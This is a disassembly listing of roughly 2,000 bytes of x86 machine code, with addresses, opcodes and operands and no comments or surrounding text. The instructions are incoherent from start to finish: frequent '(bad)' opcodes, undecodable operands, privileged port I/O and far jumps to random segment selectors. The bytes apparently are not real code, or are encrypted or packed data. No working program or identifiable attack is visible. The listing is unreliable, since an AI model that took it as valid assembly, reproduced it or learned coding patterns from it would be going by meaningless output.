  4111da:	xlat   BYTE PTR ds:[ebx]
  4111db:	lods   eax,DWORD PTR ds:[esi]
  4111dc:	inc    esi
  4111dd:	loope  0x411230
  4111df:	sbb    DWORD PTR [edi-0x4677c5dd],0xa1cab73b
  4111e9:	adc    DWORD PTR [esi-0x2d],edx
  4111ec:	push   0x20117bfa
  4111f1:	loopne 0x4111c9
  4111f3:	shr    BYTE PTR [edi-0x19],cl
  4111f6:	pop    esp
  4111f7:	or     al,0xf2
  4111f9:	fcomip st,st(3)
  4111fb:	mov    ch,0x6d
  4111fd:	cmp    cl,BYTE PTR [eax-0x9]
  411200:	xchg   ebp,eax
  411201:	inc    edx
  411202:	push   ecx
  411203:	adc    eax,0x2890f43
  411208:	sub    DWORD PTR [edi+0x37],esi
  41120b:	pusha  
  41120c:	and    bl,BYTE PTR [edi-0x26]
  41120f:	call   0xb6084860
  411214:	fnstenv [edx+0x53f637d1]
  41121a:	lods   eax,DWORD PTR ds:[esi]
  41121b:	push   es
  41121c:	mov    eax,ds:0x1ac67214
  411221:	loope  0x411258
  411223:	mov    bh,0x8
  411225:	in     eax,dx
  411226:	das    
  411227:	add    ch,BYTE PTR [ebx]
  411229:	mov    esp,0x4b65f1ca
  41122e:	ss int3 
  411230:	jne    0x411230
  411232:	mov    ?,WORD PTR [ecx+0xa94b298]
  411238:	test   DWORD PTR [esi+edx*8-0x3c44f34b],0x57755c09
  411243:	pusha  
  411244:	mov    ebx,0x65a4e67f
  411249:	ss push 0x10
  41124c:	les    esi,FWORD PTR [eax-0x6d]
  41124f:	bound  edx,QWORD PTR [eax-0x488bd496]
  411255:	scas   eax,DWORD PTR es:[edi]
  411256:	mov    eax,ds:0x8dba7380
  41125b:	ret    
  41125c:	retf   0x5b98
  41125f:	jecxz  0x411221
  411261:	mov    ds:0x22a687c2,al
  411266:	test   DWORD PTR [eax+0x4fb6ed9d],eax
  41126c:	scas   al,BYTE PTR es:[edi]
  41126d:	sar    BYTE PTR [edi+0x52e6aef0],cl
  411273:	sbb    esp,DWORD PTR [ebx-0x367982f0]
  411279:	sbb    eax,0x96c19c4c
  41127e:	loop   0x41129f
  411280:	(bad)  
  411282:	cmp    ah,BYTE PTR [ebp+0x4b]
  411285:	mov    dh,BYTE PTR [edi+0xc40f722]
  41128b:	call   ebp
  41128d:	adc    edx,DWORD PTR [edx]
  41128f:	outs   dx,DWORD PTR ds:[esi]
  411290:	fst    DWORD PTR [edi+0x6]
  411293:	xchg   DWORD PTR [ecx+0xe],esi
  411296:	pop    edx
  411297:	fst    QWORD PTR [ebp+0x72286abf]
  41129d:	call   0xe657:0xb05d4071
  4112a4:	repz or dl,BYTE PTR [ebx-0x35]
  4112a8:	mov    ah,0x9d
  4112aa:	mov    edx,0x906a68c6
  4112af:	loopne 0x4112dd
  4112b1:	rcl    cl,cl
  4112b3:	int3   
  4112b4:	pop    ds
  4112b5:	sahf   
  4112b6:	dec    ebp
  4112b7:	dec    esi
  4112b8:	imul   esi,DWORD PTR [esp+eax*8-0x250ec716],0x1d
  4112c0:	sbb    al,BYTE PTR [ebp+0x5b8825d0]
  4112c6:	xor    al,BYTE PTR fs:[ebp+eiz*8-0x36]
  4112cb:	jg     0x41131f
  4112cd:	push   0xa54d369f
  4112d2:	jno    0x41130f
  4112d4:	jno    0x4112dd
  4112d6:	mov    ss,WORD PTR [esi+0x14]
  4112d9:	out    dx,eax
  4112da:	xor    DWORD PTR [ebx],esp
  4112dc:	fiadd  WORD PTR [edi]
  4112de:	ficom  WORD PTR ds:[edi+edi*8+0x43678aad]
  4112e6:	mov    dh,0x28
  4112e8:	mov    ch,0x73
  4112ea:	adc    al,0xb2
  4112ec:	imul   edx,DWORD PTR [ebx+0xe],0x9b2482d4
  4112f3:	adc    DWORD PTR [esi+0x36],0x0
  4112f7:	jns    0x411355
  4112f9:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4112fb:	pop    esp
  4112fc:	cmp    dl,BYTE PTR [edx+0x3d]
  4112ff:	pop    edx
  411300:	(bad)  
  411301:	dec    edx
  411302:	mov    bl,0x31
  411304:	popf   
  411305:	pop    ebx
  411306:	add    eax,0x931cfb6a
  41130b:	scas   al,BYTE PTR es:[edi]
  41130c:	ret    0xcdbf
  41130f:	scas   eax,DWORD PTR es:[edi]
  411310:	jmp    DWORD PTR gs:[bx+si-0x37]
  411315:	cmp    al,0xdb
  411317:	push   esi
  411318:	ss lahf 
  41131a:	jno    0x411355
  41131c:	jae    0x411312
  41131e:	jns    0x4112c5
  411320:	dec    edi
  411322:	add    al,0x32
  411324:	mov    dl,0xd1
  411326:	mov    dl,0xed
  411328:	inc    edi
  411329:	sbb    eax,0x971c050c
  41132e:	pop    ebx
  41132f:	pop    ebx
  411330:	int3   
  411331:	jge    0x4112eb
  411333:	loopne 0x41138b
  411335:	xor    cx,WORD PTR [edx]
  411338:	or     al,0xca
  41133a:	and    al,0xd2
  41133c:	inc    esi
  41133d:	pop    esp
  41133e:	cmp    ebx,DWORD PTR [eax+0x45]
  411341:	mov    bh,0xc7
  411343:	out    dx,al
  411344:	(bad)
  411347:	sub    eax,DWORD PTR [eax+0x59353c81]
  41134d:	jno    0x411327
  41134f:	aaa    
  411350:	and    DWORD PTR [edi],ebx
  411352:	xchg   edx,eax
  411353:	enter  0x2300,0xec
  411357:	shr    edx,cl
  411359:	fstp   st(6)
  41135b:	rcr    BYTE PTR ds:0xf162b50,1
  411361:	mov    eax,0x96e9bcb1
  411366:	stos   BYTE PTR es:[edi],al
  411367:	push   eax
  411368:	aaa    
  411369:	cli    
  41136a:	dec    edi
  41136b:	and    eax,0xbdd53a72
  411370:	mul    BYTE PTR [ebx+0xc]
  411373:	sbb    DWORD PTR [esi],esi
  411375:	cdq    
  411376:	mov    bl,0x30
  411378:	(bad)  
  411379:	cmp    al,0x1f
  41137b:	mov    ebx,0x9d051d49
  411380:	mov    bh,0x7b
  411382:	pushf  
  411383:	pop    edx
  411384:	in     al,dx
  411385:	test   ebp,ecx
  411387:	jns    0x41136b
  411389:	add    cl,BYTE PTR [eax]
  41138b:	push   ss
  41138c:	mov    edx,0x2d146994
  411391:	hlt    
  411392:	fwait
  411393:	adc    al,0x1f
  411395:	mov    esi,0x1e98d33b
  41139a:	sub    eax,0x5e873e8c
  41139f:	in     al,0x3f
  4113a1:	inc    ebp
  4113a2:	xchg   DWORD PTR [esi-0x6a],edx
  4113a5:	loopne 0x4113de
  4113a7:	add    ch,BYTE PTR [esi-0x38]
  4113aa:	mov    WORD PTR [esi+0x7c373790],fs
  4113b0:	and    BYTE PTR [edx+0x17],dh
  4113b3:	mov    ecx,0x758c2f34
  4113b8:	daa    
  4113b9:	jmp    0x664d:0xd74685c3
  4113c0:	pop    ecx
  4113c1:	inc    edi
  4113c2:	pop    es
  4113c3:	sbb    eax,0xda2f87bb
  4113c8:	aam    0x3d
  4113ca:	(bad)  
  4113cc:	in     al,0xae
  4113ce:	cmp    al,0x76
  4113d0:	loop   0x4113c3
  4113d2:	jge    0x41135c
  4113d4:	enter  0xb20a,0xf3
  4113d8:	mov    eax,DWORD PTR [ecx+0x19]
  4113db:	stos   BYTE PTR es:[edi],al
  4113dc:	jmp    0x1515:0x34dffb
  4113e3:	popa   
  4113e4:	jecxz  0x41137c
  4113e6:	jmp    0xa45988b3
  4113eb:	(bad)  
  4113ec:	fmul   DWORD PTR [esi+ebp*4-0x28]
  4113f0:	popa   
  4113f1:	lea    esp,[edi-0x29a17a00]
  4113f7:	shl    ebp,0x2b
  4113fa:	xlat   BYTE PTR ds:[ebx]
  4113fb:	loop   0x4113f0
  4113fd:	xor    eax,0xc08767bc
  411402:	push   edx
  411403:	mov    ebx,0xbf766a79
  411408:	xchg   DWORD PTR [ecx],esp
  41140a:	push   ss
  41140b:	in     al,dx
  41140c:	cdq    
  41140d:	mov    dh,0x69
  41140f:	rcl    BYTE PTR [ecx+0x1c],1
  411412:	push   ss
  411413:	gs pop edx
  411415:	mov    cl,0x79
  411417:	inc    edx
  411418:	lea    ecx,[edx+0x0]
  41141b:	dec    ecx
  41141c:	mov    es,WORD PTR [ecx-0x7a]
  41141f:	fst    DWORD PTR [ebx]
  411421:	and    eax,0x8dc79de9
  411426:	(bad)  
  411427:	(bad)  
  411428:	cmc    
  411429:	add    ecx,DWORD PTR [esi+0x44d209b7]
  41142f:	mov    cl,0x17
  411431:	loopne 0x411491
  411433:	shl    DWORD PTR [edx],1
  411435:	pop    esi
  411436:	pop    edi
  411437:	out    0xd7,al
  411439:	xor    eax,0x3c4b9ffd
  41143e:	je     0x4114a9
  411440:	pushfw 
  411442:	xchg   ebp,eax
  411443:	dec    ecx
  411444:	popf   
  411445:	mov    al,0x18
  411447:	scas   eax,DWORD PTR es:[edi]
  411448:	popa   
  411449:	cli    
  41144a:	addr16 xchg edx,eax
  41144c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41144d:	and    ebp,DWORD PTR [ecx+0x16]
  411450:	ins    DWORD PTR es:[edi],dx
  411451:	fist   DWORD PTR [esi-0x44]
  411454:	pusha  
  411455:	repnz nop
  411457:	les    ecx,FWORD PTR [edi+0x59e217a6]
  41145d:	add    esi,edx
  41145f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411460:	push   0x92f8ac59
  411465:	test   al,0x4b
  411467:	xchg   edi,eax
  411468:	js     0x4113ec
  41146a:	ins    BYTE PTR es:[edi],dx
  41146b:	mov    ?,WORD PTR [ebx-0x18037956]
  411471:	sub    BYTE PTR [ebx+ecx*1+0x4c474e92],cl
  411478:	sbb    ebx,0xffffffdf
  41147b:	repnz shr dl,0xff
  41147f:	out    0xc,al
  411481:	cmp    al,0x98
  411483:	or     dl,ch
  411485:	sub    eax,0x253e5f48
  41148a:	jno    0x411471
  41148c:	mov    edi,0x614b3aac
  411491:	inc    eax
  411492:	stc    
  411493:	fld    QWORD PTR [eax-0x7a2d39cb]
  411499:	lds    ebx,FWORD PTR [edx]
  41149b:	sets   al
  41149e:	jnp    0x4114d3
  4114a0:	push   edi
  4114a1:	adc    DWORD PTR [edx+0x175e944e],esi
  4114a7:	in     al,0x46
  4114a9:	xchg   edi,ebp
  4114ab:	push   0x30
  4114ad:	cld    
  4114ae:	mov    cl,0xdc
  4114b0:	mov    cl,0x7c
  4114b2:	adc    al,0xbe
  4114b4:	mov    esp,DWORD PTR [edx]
  4114b6:	mov    DWORD PTR [edi+0x76e7d4ba],esp
  4114bc:	and    DWORD PTR [ebx-0x7fba542f],0x9c64ae40
  4114c6:	repz add BYTE PTR [edi+esi*4-0x5a],ch
  4114cb:	stos   BYTE PTR es:[edi],al
  4114cc:	sbb    eax,edi
  4114ce:	retf   0xbcd0
  4114d1:	fst    QWORD PTR cs:[eax+0x13]
  4114d5:	je     0x411534
  4114d7:	cdq    
  4114d8:	add    eax,0x354b51d5
  4114dd:	inc    eax
  4114de:	inc    edx
  4114df:	pop    edx
  4114e0:	(bad)  
  4114e1:	leave  
  4114e2:	mov    eax,ds:0xca286689
  4114e7:	lock dec esi
  4114e9:	jmp    0x2c49:0xcb104b6
  4114f0:	repz in eax,0xc
  4114f3:	cmp    DWORD PTR [eax-0xe2e1ee8],0xffffffbe
  4114fa:	and    DWORD PTR [edx-0x7ba8f255],esp
  411500:	pop    ss
  411501:	mov    WORD PTR ds:0x3c412913,ss
  411507:	xor    al,0x38
  411509:	stos   BYTE PTR es:[edi],al
  41150a:	mov    ebp,0x91055166
  41150f:	adc    ebx,DWORD PTR [edi-0x4db2604f]
  411515:	lock inc esp
  411517:	fld    DWORD PTR [edi]
  411519:	in     eax,dx
  41151a:	push   0x5e
  41151c:	sbb    eax,0x5e0d047e
  411521:	(bad)  
  411522:	int3   
  411523:	std    
  411524:	stos   BYTE PTR es:[edi],al
  411525:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411526:	jo     0x41153d
  411528:	sub    al,0x12
  41152a:	sub    ecx,DWORD PTR [edi+0x1514f859]
  411530:	cld    
  411531:	(bad)  
  411532:	and    ecx,edx
  411534:	sbb    al,0xc
  411536:	retf   0x6993
  411539:	cld    
  41153a:	popa   
  41153b:	arpl   WORD PTR [edi+ebx*4],sp
  41153e:	push   0x5b
  411540:	xor    DWORD PTR [edx],ecx
  411542:	enter  0xc45e,0x3f
  411546:	jns    0x4115c5
  411548:	xchg   ecx,eax
  411549:	sbb    edi,DWORD PTR [eax+0x2]
  41154c:	or     ebp,DWORD PTR [eax-0x58b8448]
  411552:	icebp  
  411553:	lahf   
  411554:	in     al,dx
  411555:	inc    ebp
  411556:	mov    esp,0xa9b12282
  41155b:	pop    edx
  41155c:	xor    edi,DWORD PTR [ecx+0x3ab31a73]
  411562:	sbb    bh,bl
  411564:	iret   
  411565:	xchg   DWORD PTR [esi-0x30],ebp
  411568:	repz pop edx
  41156a:	sahf   
  41156b:	sti    
  41156c:	dec    edi
  41156d:	dec    ebp
  41156e:	xor    ah,BYTE PTR [edx-0x6b]
  411571:	inc    edi
  411572:	mov    dh,0xea
  411574:	mov    WORD PTR [eax],cs
  411576:	cmp    BYTE PTR [edx],bl
  411578:	sub    DWORD PTR [ecx],edi
  41157a:	jb     0x411586
  41157c:	in     eax,0xb1
  41157e:	pop    es
  41157f:	add    ebp,DWORD PTR [ebx+0x68]
  411582:	repnz add ch,BYTE PTR [edi]
  411585:	dec    esi
  411586:	fisub  WORD PTR [ecx+ecx*8-0x15c27589]
  41158d:	and    DWORD PTR [ecx],0xd52a61b5
  411593:	push   ebp
  411594:	fist   DWORD PTR [eax+0x74861fa4]
  41159a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41159b:	retf   0xad17
  41159e:	cmp    al,0x8
  4115a0:	(bad)  
  4115a1:	ins    BYTE PTR es:[edi],dx
  4115a2:	mov    dl,0x85
  4115a4:	outs   dx,BYTE PTR ds:[esi]
  4115a5:	jecxz  0x4115f2
  4115a7:	ins    BYTE PTR es:[edi],dx
  4115a8:	and    edx,DWORD PTR [edx-0x23ebaaca]
  4115ae:	ja     0x41155b
  4115b0:	stos   BYTE PTR es:[edi],al
  4115b1:	pop    edi
  4115b2:	jmp    0xde50:0xf61c31f1
  4115b9:	popf   
  4115ba:	test   BYTE PTR [esi-0x43535e7c],dl
  4115c0:	in     al,0x75
  4115c2:	ret    0xafd
  4115c5:	loop   0x411581
  4115c7:	adc    BYTE PTR [ecx+0x856d220],dh
  4115cd:	fdiv   DWORD PTR [ecx-0x1f30ef03]
  4115d3:	xor    DWORD PTR [ecx+esi*2-0x3e],0xd
  4115d8:	dec    eax
  4115d9:	xor    ebx,DWORD PTR [ebx+0x70]
  4115dc:	rol    BYTE PTR [ecx+0x3f07941e],cl
  4115e2:	adc    DWORD PTR [edi],esp
  4115e4:	loopne 0x411619
  4115e6:	xchg   edx,eax
  4115e7:	jbe    0x41164d
  4115e9:	mov    ebp,0x87864ec4
  4115ee:	push   ecx
  4115ef:	push   edi
  4115f0:	aas    
  4115f1:	int    0xcf
  4115f3:	or     BYTE PTR [edx-0x6cfd1d79],ch
  4115f9:	xor    DWORD PTR [edi+0x62259d6d],0xb98a8299
  411603:	adc    DWORD PTR [edi-0x200e8253],edi
  411609:	or     DWORD PTR [ecx],ecx
  41160b:	nop    DWORD PTR [esp+edi*2-0x4f]
  411610:	(bad)  
  411611:	cdq    
  411612:	cmp    BYTE PTR [edx+esi*8+0x2daf2e1c],0x6c
  41161a:	lods   al,BYTE PTR ds:[esi]
  41161b:	retf   
  41161c:	jne    0x411645
  41161e:	jae    0x4115c4
  411620:	pop    es
  411621:	je     0x411646
  411623:	scas   al,BYTE PTR es:[edi]
  411624:	inc    edx
  411625:	fwait
  411626:	inc    esi
  411627:	jnp    0x411632
  411629:	or     al,0xe9
  41162b:	scas   eax,DWORD PTR es:[edi]
  41162c:	pop    ss
  41162d:	call   0x722e:0x7882e740
  411634:	in     eax,dx
  411635:	out    dx,al
  411636:	jae    0x411689
  411638:	pop    ds
  411639:	into   
  41163a:	push   ss
  41163b:	retf   
  41163c:	cs mov ah,0x0
  41163f:	shl    BYTE PTR [eax+0x48e0daec],0xcb
  411646:	pop    ds
  411647:	cmp    ebp,edi
  411649:	mov    esp,0xec5c960e
  41164e:	outs   dx,BYTE PTR ds:[esi]
  41164f:	xor    eax,0x48240b98
  411654:	xchg   DWORD PTR ds:0x4b95baea,ecx
  41165a:	rcl    DWORD PTR [edi],0xc5
  41165d:	or     al,0x84
  41165f:	pushf  
  411660:	adc    BYTE PTR [esi+0x685df263],ch
  411666:	shl    ch,1
  411668:	push   cs
  411669:	lock sti 
  41166b:	pushf  
  41166c:	sub    BYTE PTR [ecx],cl
  41166e:	jmp    0x411601
  411670:	imul   eax
  411672:	lds    ecx,FWORD PTR [ecx-0x15d385bb]
  411678:	and    esp,DWORD PTR [ecx+0x33]
  41167b:	add    al,0x3c
  41167d:	lods   al,BYTE PTR ds:[esi]
  41167e:	dec    ecx
  41167f:	jl     0x411609
  411681:	jno    0x4116e1
  411683:	pop    edi
  411684:	adc    dl,ch
  411686:	std    
  411687:	mov    DWORD PTR [eax+0x162f7669],eax
  41168d:	ins    DWORD PTR es:[edi],dx
  41168e:	xchg   esp,eax
  41168f:	idiv   DWORD PTR [ecx+0x2295a492]
  411695:	(bad)  
  411696:	sub    ecx,DWORD PTR [esi+0x22eaa171]
  41169c:	arpl   WORD PTR [ebx+0x8df50ab],di
  4116a2:	cdq    
  4116a3:	mov    ebp,0xeed344b1
  4116a8:	xchg   ecx,eax
  4116a9:	pop    eax
  4116aa:	lds    ebp,FWORD PTR [si]
  4116ad:	imul   eax,eax,0xfffffffa
  4116b0:	stc    
  4116b1:	fs call 0xc8367011
  4116b7:	out    0xbc,al
  4116b9:	int3   
  4116ba:	stc    
  4116bb:	xor    BYTE PTR [ebx],al
  4116bd:	pusha  
  4116be:	jle    0x411703
  4116c0:	aad    0x77
  4116c2:	or     ebx,ebp
  4116c4:	loope  0x41168c
  4116c6:	repz neg DWORD PTR [ebx+0x46]
  4116ca:	es dec edx
  4116cc:	mov    ecx,0x1eef26d2
  4116d1:	sub    eax,0xf2058665
  4116d6:	pop    es
  4116d7:	pop    esp
  4116d8:	int3   
  4116d9:	sti    
  4116da:	push   ds
  4116db:	adc    eax,0x4eda8fac
  4116e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116e1:	dec    esp
  4116e2:	mov    cl,0xd9
  4116e4:	xlat   BYTE PTR ds:[ebx]
  4116e5:	ret    
  4116e6:	(bad)
  4116e9:	or     al,BYTE PTR [edx]
  4116eb:	xchg   ebx,eax
  4116ec:	hlt    
  4116ed:	lods   al,BYTE PTR ds:[esi]
  4116ee:	arpl   WORD PTR [esi+0x7720911e],sp
  4116f4:	mov    cs,esi
  4116f6:	pop    esp
  4116f7:	and    al,0x6c
  4116f9:	xor    al,0x65
  4116fb:	push   eax
  4116fc:	mov    bh,0xae
  4116fe:	cld    
  4116ff:	shl    BYTE PTR [ebx],1
  411701:	std    
  411702:	into   
  411703:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411704:	dec    ecx
  411705:	int3   
  411706:	clc    
  411707:	scas   al,BYTE PTR es:[edi]
  411708:	pop    ecx
  411709:	or     ah,BYTE PTR [esi+0x4b]
  41170c:	popa   
  41170d:	jae    0x411747
  41170f:	outs   dx,BYTE PTR fs:[esi]
  411711:	shl    ah,1
  411713:	ret    0x191f
  411716:	daa    
  411717:	mov    ebp,DWORD PTR [edx+0x51]
  41171a:	fst    DWORD PTR [edi]
  41171c:	ret    
  41171d:	ror    DWORD PTR [ebp+0x66],0x74
  411721:	cmp    BYTE PTR ds:0xe5171e1a,0xce
  411728:	sahf   
  411729:	sub    al,0xe4
  41172b:	add    eax,0x5f013d0e
  411730:	mov    esp,0xe277b57f
  411735:	dec    esi
  411736:	loop   0x411737
  411738:	cwde   
  411739:	mov    ds:0xecc4d5a8,al
  41173e:	cmc    
  41173f:	mov    cl,al
  411741:	mov    dh,0x6c
  411743:	xor    ecx,ebx
  411745:	aam    0xac
  411747:	jmp    0xf32:0xdbcbfe8f
  41174e:	xchg   ebx,eax
  41174f:	cwde   
  411750:	mov    ds:0xb537b5aa,al
  411755:	repz dec esp
  411757:	xchg   dh,bh
  411759:	mov    ds:0x16e1f385,al
  41175e:	sbb    BYTE PTR [edx-0x35f9bde8],cl
  411764:	mov    edi,0x59960dc4
  411769:	push   esp
  41176a:	cli    
  41176b:	in     eax,dx
  41176c:	cmp    eax,0x1be1c67c
  411771:	mov    cl,0xb5
  411773:	pop    ebp
  411774:	int    0x3d
  411776:	push   0x1d
  411778:	in     eax,dx
  411779:	enter  0x93ab,0x7c
  41177d:	mov    DWORD PTR [ecx],ecx
  41177f:	fcomp  st(2)
  411781:	(bad)  
  411782:	punpcklbw mm4,DWORD PTR [edx+ecx*1+0x22]
  411787:	xor    BYTE PTR [ebp-0x39],bl
  41178a:	add    esp,DWORD PTR [esi+0x7efc93df]
  411790:	shl    ecx,0x88
  411793:	sar    BYTE PTR [ebx],1
  411795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411796:	test   eax,0x56c97a8d
  41179b:	add    dh,ch
  41179d:	jl     0x411767
  41179f:	cmp    BYTE PTR [esi+esi*8-0x36],ch
  4117a3:	inc    ebx
  4117a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117a5:	fprem1 
  4117a7:	sbb    bh,bh
  4117a9:	pop    es
  4117aa:	jl     0x411804
  4117ac:	lods   al,BYTE PTR ds:[esi]
  4117ad:	push   esi
  4117ae:	mov    ebx,0x3ceb4020
  4117b3:	inc    ebp
  4117b4:	repz pop ecx
  4117b6:	(bad)  
  4117b8:	lahf   
  4117b9:	mov    ?,WORD PTR [edi]
  4117bb:	ret    0x459e
  4117be:	sub    esi,ebp
  4117c0:	out    0xf4,eax
  4117c2:	cmc    
  4117c3:	xchg   ebp,eax
  4117c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117c5:	inc    ebx
  4117c6:	jno    0x41183d
  4117c8:	cmp    cl,BYTE PTR [esi-0x34ef02fc]
  4117ce:	shl    DWORD PTR [esi-0x6e],cl
  4117d1:	stc    
  4117d2:	mov    ds,ecx
  4117d4:	jno    0x4117ce
  4117d6:	(bad)  
  4117d7:	ds push 0x9a3f69b8
  4117dd:	fbld   TBYTE PTR [edx-0x75]
  4117e0:	addr16 jmp 0x75ce:0x15db8cfa
  4117e8:	mov    dl,0xd
  4117ea:	stos   BYTE PTR es:[edi],al
  4117eb:	or     edi,esi
  4117ed:	out    dx,eax
  4117ee:	sub    eax,0xe7a8e94d
  4117f3:	dec    ebx
  4117f4:	inc    ebx
  4117f5:	adc    bl,BYTE PTR [edi+0x3d53fd34]
  4117fb:	int    0x57
  4117fd:	or     ah,BYTE PTR [esi+0x2b2de71e]
  411803:	xor    bl,dh
  411805:	push   edi
  411806:	pop    ebx
  411807:	mov    eax,0xec8d3e8d
  41180c:	mov    eax,0xb55f9760
  411811:	jno    0x41185d
  411813:	(bad)  
  411814:	mov    dl,0x28
  411816:	mov    edx,0xd86692a4
  41181c:	lds    ebx,FWORD PTR [ebx]
  41181e:	dec    esp
  41181f:	test   BYTE PTR [edx+0x64],0x90
  411823:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411824:	xlat   BYTE PTR ds:[ebx]
  411825:	cli    
  411826:	pop    edx
  411827:	pop    esp
  411828:	fisubr DWORD PTR [edx-0x4df79744]
  41182e:	retf   
  41182f:	xchg   ebx,eax
  411830:	stc    
  411831:	adc    edi,0x51cb8958
  411837:	xchg   BYTE PTR [edi-0x50],bh
  41183a:	or     eax,0x7c3047e3
  41183f:	xchg   ecx,eax
  411840:	and    DWORD PTR [esp+ebx*1],esp
  411843:	retf   0xaf33
  411846:	and    DWORD PTR [edx-0x404fb4da],ecx
  41184c:	stos   DWORD PTR es:[edi],eax
  41184d:	cld    
  41184e:	out    0x57,eax
  411850:	push   ss
  411851:	(bad)  
  411852:	scas   al,BYTE PTR es:[edi]
  411853:	add    cl,BYTE PTR [edi+0x72036100]
  411859:	imul   ecx,DWORD PTR [ecx-0x7b],0xb20ad5a7
  411860:	mov    bl,0x8d
  411862:	add    al,bl
  411864:	ret    0x2982
  411867:	add    eax,esi
  411869:	retf   0x493c
  41186c:	iret   
  41186d:	add    DWORD PTR ds:0x51d474f0,esi
  411873:	push   ebx
  411874:	mov    WORD PTR [ebx+0x65],fs
  411877:	mov    ch,0xe1
  411879:	mov    esi,0xa3ad2f35
  41187e:	add    eax,0x71735bae
  411883:	cs sub ah,ah
  411886:	mov    ds:0x8a2b21ae,al
  41188b:	lock push eax
  41188d:	adc    DWORD PTR [edi-0x62],0xa22e4565
  411894:	imul   esp,eax,0xffffffb3
  411897:	mov    cl,0xb4
  411899:	pop    esi
  41189a:	inc    ecx
  41189b:	daa    
  41189c:	test   eax,0x9d9211a2
  4118a1:	cmp    DWORD PTR [ebx+ebp*1],ebp
  4118a4:	jnp    0x4118d9
  4118a6:	add    al,0xba
  4118a8:	stc    
  4118a9:	loopne 0x411907
  4118ab:	adc    al,0xc5
  4118ad:	adc    dh,BYTE PTR [eax+0x64a37bae]
  4118b3:	xchg   ebp,eax
  4118b4:	imul   ecx,DWORD PTR [eax],0xb3554554
  4118ba:	push   esi
  4118bb:	or     esi,ebx
  4118bd:	ud0    esp,DWORD PTR [ebp-0x6af142ae]
  4118c4:	data16 fiadd DWORD PTR [edi+0x79ee8817]
  4118cb:	push   0x748fe7b5
  4118d0:	rcl    DWORD PTR [ecx],0x2d
  4118d3:	mov    ah,0xe0
  4118d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118d6:	xchg   edi,eax
  4118d7:	jae    0x4118a7
  4118d9:	dec    esp
  4118da:	xchg   ebx,eax
  4118db:	test   eax,0xeb051f98
  4118e0:	jne    0x4118a2
  4118e2:	xor    BYTE PTR [edi],dh
  4118e4:	cmp    BYTE PTR [eax-0xf],bh
  4118e7:	je     0x41189a
  4118e9:	cmp    eax,0x24fcf42a
  4118ee:	in     eax,dx
  4118ef:	ret    
  4118f0:	and    al,0x25
  4118f2:	xchg   esp,eax
  4118f3:	push   esi
  4118f4:	(bad)  
  4118f5:	bound  eax,QWORD PTR [edi-0xb]
  4118f8:	push   es
  4118f9:	add    BYTE PTR [esi+0xef2592e],ah
  4118ff:	jo     0x41194b
  411901:	pop    eax
  411902:	pop    esi
  411903:	shr    ebx,1
  411905:	dec    ebx
  411906:	leave  
  411907:	mov    dl,0xb4
  411909:	and    edx,ebp
  41190b:	popa   
  41190c:	addr16 enter 0x3f98,0xb0
  411911:	scas   eax,DWORD PTR es:[edi]
  411912:	sub    eax,0xb5c98105
  411917:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411918:	push   esi
  411919:	(bad)  
  41191a:	popa   
  41191b:	rol    ecx,1
  41191d:	jnp    0x4118c8
  41191f:	adc    ebp,DWORD PTR [ebx-0x1ca26330]
  411925:	cdq    
  411926:	pop    ebx
  411927:	xchg   ebx,eax
  411928:	stos   BYTE PTR es:[edi],al
  411929:	mov    ah,0x4e
  41192b:	stc    
  41192c:	repnz add al,0xdf
  41192f:	adc    BYTE PTR [eax],0x79
  411932:	xchg   ebx,eax
  411933:	jmp    0x6fde028c
  411938:	test   DWORD PTR ds:0xdf2b2456,edi
  41193e:	js     0x41190b
  411940:	cmp    BYTE PTR [edx],bh
  411942:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411943:	dec    edi
  411944:	and    cl,BYTE PTR [ebp+0x40]
  411947:	xchg   ebx,eax
  411948:	adc    eax,DWORD PTR [esi+0x7c]
  41194b:	rcr    DWORD PTR [ecx],1
  41194d:	test   eax,0x50178bbf
  411952:	loope  0x41194f
  411954:	sbb    BYTE PTR ds:0xfbac96f1,bh
  41195a:	add    DWORD PTR [ebp+0x5afae7a9],esi
  411960:	pop    ebp
  411961:	jmp    0x44ef:0x9b49e7af
  411968:	push   ebx
  411969:	inc    ebx
  41196a:	sahf   
  41196b:	add    DWORD PTR [esi],edx
  41196d:	add    DWORD PTR [ebx+0x254d9844],ecx
  411973:	cmc    
  411974:	mov    ecx,0x31173dea
  411979:	mov    al,0x6
  41197b:	(bad)  
  41197d:	cmp    ch,dl
  41197f:	mov    bh,0x6c
  411981:	(bad)  
  411982:	and    al,dl
  411984:	fmulp  st(6),st
  411986:	jbe    0x41190d
  411988:	pop    ebp
  411989:	cmc    
  41198a:	mov    ah,0x8
  41198c:	fist   DWORD PTR ds:0x3078314f
  411992:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411993:	add    esi,ecx
  411995:	pop    edx
  411996:	arpl   cx,di
  411998:	pop    ecx
  411999:	cmp    DWORD PTR [edx-0x40],esi
  41199c:	jno    0x411962
  41199e:	push   ss
  41199f:	and    ebx,DWORD PTR [esi+0x3085375d]
  4119a5:	aaa    
  4119a6:	xchg   ch,ah
  4119a8:	dec    ebp
  4119a9:	jle    0x4119e9
  4119ab:	aam    0xd6
  4119ad:	mov    edi,0xa53aa26f
  4119b2:	push   ecx
  4119b3:	cli    
  4119b4:	scas   eax,DWORD PTR es:[edi]
  4119b5:	ins    DWORD PTR es:[edi],dx
  4119b6:	pop    edi
  4119b7:	jge    0x411985
  4119b9:	push   ecx
  4119ba:	mov    esi,0x4233729e
  4119bf:	jmp    0xfe52:0x2f10226d
  4119c6:	jo     0x411a25
  4119c8:	call   0xf4edc138
  4119cd:	dec    edi
  4119ce:	jns    0x411a47
  4119d0:	inc    esi
  4119d1:	xor    BYTE PTR [edx-0x419d8ec0],0xec
  4119d8:	das    
